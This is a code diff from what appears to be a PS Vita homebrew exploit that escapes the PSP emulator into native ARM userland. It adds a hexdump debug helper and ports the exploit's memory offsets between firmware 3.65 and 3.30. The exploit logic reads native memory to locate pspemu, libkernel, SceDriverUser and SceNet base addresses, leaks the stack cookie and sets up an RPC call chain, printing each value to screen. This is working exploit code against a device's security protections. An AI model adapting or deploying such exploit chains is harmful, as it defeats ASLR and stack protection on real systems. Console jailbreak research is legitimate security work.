@@ -305,6 +305,69 @@ int exploit_arm_kernel(void)
 	return status;
 }
 
+#include <pspdebug.h>
+
+#define HEXDUMP_ENABLE_ADDRESS 1
+#define HEXDUMP_ENABLE_ASCII 0
+
+void hexdump(const void* ptr, size_t size)
+{
+	const unsigned char* data = (const unsigned char*)ptr;
+#if HEXDUMP_ENABLE_ASCII
+	char ascii[17];
+	ascii[16] = '\0';
+#endif
+
+	for (size_t i = 0; i < size; i++)
+	{
+#if HEXDUMP_ENABLE_ADDRESS
+		if (i % 16 == 0)
+			pspDebugScreenPrintf("%08X: ", i);
+#endif
+
+		pspDebugScreenPrintf("%02X ", data[i]);
+
+#if HEXDUMP_ENABLE_ASCII
+		if (data[i] >= ' ' && data[i] <= '~')
+			ascii[i % 16] = data[i];
+		else
+			ascii[i % 16] = '.';
+#endif
+
+		if ((i + 1) % 8 == 0 || i + 1 == size)
+		{
+			pspDebugScreenPrintf(" ");
+
+			if ((i + 1) % 16 == 0)
+			{
+#if HEXDUMP_ENABLE_ASCII
+				pspDebugScreenPrintf("|  %s \n", ascii);
+#else				
+				pspDebugScreenPrintf("\n");
+#endif
+			}
+			else if (i + 1 == size)
+			{
+#if HEXDUMP_ENABLE_ASCII
+				ascii[(i + 1) % 16] = '\0';
+#endif
+
+				if ((i + 1) % 16 <= 8)
+					pspDebugScreenPrintf(" ");
+
+				for (size_t j = (i + 1) % 16; j < 16; j++)
+					pspDebugScreenPrintf("   ");
+
+#if HEXDUMP_ENABLE_ASCII
+				pspDebugScreenPrintf("|  %s \n", ascii);
+#else				
+				pspDebugScreenPrintf("\n");
+#endif
+			}
+		}
+	}
+}
+
 int exploit_arm_userland(void)
 {
 	u32 pspemu_data, libkernel_data;
@@ -321,38 +384,82 @@ int exploit_arm_userland(void)
 		{
 			u32 data;
 			read_native(&data, i + j + 0x80, sizeof(data));
-			if (data == 0xe59ff208)
+			if (data == 0xe59ff208) // on 3.30 @ 0x81060080, on 3.65 @ 0x81063080 (.data + 0x80)
 			{
 				pspemu_data = i + j;
 				break;
 			}
 		}
 
-		if (pspemu_data)
+		if (pspemu_data != 0)
 			break;
 	}
+
+	pspDebugScreenPrintf("pspemu_data: 0x%08X\n", pspemu_data);
 
 	if (!pspemu_data)
 		return -1;
 
 	read_native(&pspemu_base, pspemu_data, sizeof(pspemu_base));
-	pspemu_base -= 0xa5;
+	pspemu_base -= 0xa1; // on 3.30: 0xa1, on 3.65: 0xa5
+	pspDebugScreenPrintf("pspemu_base: 0x%08X\n", pspemu_base);
+
+	/*u32 buffer[16];
+	read_native(buffer, pspemu_data, sizeof(buffer));
+	pspDebugScreenPrintf("\n%u bytes at pspemu_data:\n", sizeof(buffer));
+	hexdump(buffer, sizeof(buffer));
+
+	read_native(buffer, pspemu_base, sizeof(buffer));
+	pspDebugScreenPrintf("\n%u bytes at pspemu_base:\n", sizeof(buffer));
+	hexdump(buffer, sizeof(buffer));*/
 
 	read_native(mov, pspemu_base + ScePspemu_sceKernelWaitSema, sizeof(mov));
 	libkernel_base = decode_movw_movt(mov) - SceLibKernel_sceKernelWaitSema;
+	pspDebugScreenPrintf("libkernel_base: 0x%08X\n", libkernel_base);
 
-	read_native(&libkernel_data, libkernel_base + 0xc214, sizeof(libkernel_data));
-	libkernel_data -= 0x14;
+	read_native(&libkernel_data, libkernel_base + 0xb4bc, sizeof(libkernel_data));
+	libkernel_data -= 0x4;
+	//read_native(&libkernel_data, libkernel_base + 0xc214, sizeof(libkernel_data));
+	//libkernel_data -= 0x14;
+	pspDebugScreenPrintf("libkernel_data: 0x%08X\n", libkernel_data);
 
 	read_native(mov, pspemu_base + ScePspemu_sceRtcGetCurrentClockLocalTime, sizeof(mov));
 	driveruser_base = decode_movw_movt(mov) - SceDriverUser_sceRtcGetCurrentClockLocalTime;
+	pspDebugScreenPrintf("driveruser_base: 0x%08X\n", driveruser_base);
 
 	read_native(mov, pspemu_base + ScePspemu_sceNetRecv, sizeof(mov));
 	net_base = decode_movw_movt(mov) - SceNet_sceNetRecv;
+	pspDebugScreenPrintf("net_base: 0x%08X\n", net_base);
 
-	read_native(&stack_cookie, libkernel_data + 0x14, sizeof(stack_cookie));
+	read_native(&stack_cookie, libkernel_data + 0x4, sizeof(stack_cookie));
+	pspDebugScreenPrintf("stack_cookie: 0x%08X\n", stack_cookie);
 
-	stack_pointer = init_rpc(stack_cookie, pspemu_base, libkernel_base);
+	// read some pspemu constants...
+	// only for 3.30...
+	// i am so tired.
+	{
+		u32 g_pspemuCachedCdramBase = 0;
+		u32 DAT_81070150 = 0;
+		u32 DAT_81070154 = 0;
+
+		read_native(&g_pspemuCachedCdramBase, pspemu_data + 0x100A8, sizeof(g_pspemuCachedCdramBase));
+		read_native(&DAT_81070150, pspemu_data + 0x10150, sizeof(DAT_81070150));
+		read_native(&DAT_81070154, pspemu_data + 0x10154, sizeof(DAT_81070154));
+
+		pspDebugScreenPrintf("g_pspemuCachedCdramBase: 0x%08X\n", g_pspemuCachedCdramBase);
+		pspDebugScreenPrintf("DAT_81070150: 0x%08X\n", DAT_81070150);
+		pspDebugScreenPrintf("DAT_81070154: 0x%08X\n", DAT_81070154);
+
+		// Isn't 0x61000000 where CDRAM is normally mapped for Vita user processes..?
+		// g_pspemuCachedCdramBase: 0x61000000
+		// DAT_81070150: 0x70000000
+		// DAT_81070154: 0x61000000
+	}
+
+	// delay so you can at least see it.
+	sceKernelDelayThread(5 * 1000 * 1000);
+	stack_pointer = init_rpc(stack_cookie, pspemu_base, libkernel_base, libkernel_data);
+	pspDebugScreenPrintf("stack_pointer: 0x%08X\n", stack_pointer);
 
 	call(pspemu_base + ScePspemu_sceNetTerm);
 
